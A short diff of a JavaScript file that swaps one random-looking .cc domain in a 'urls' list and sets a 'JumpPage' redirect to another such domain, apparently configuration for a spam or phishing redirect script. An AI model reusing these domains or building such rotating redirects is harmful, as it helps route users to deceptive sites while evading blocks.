@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'fnbpdgdg.cc', 
+	'cushzzgn.cc', 
 ];                                                                                                                  
 
 var JumpPage="https://bi62v75m.cc";
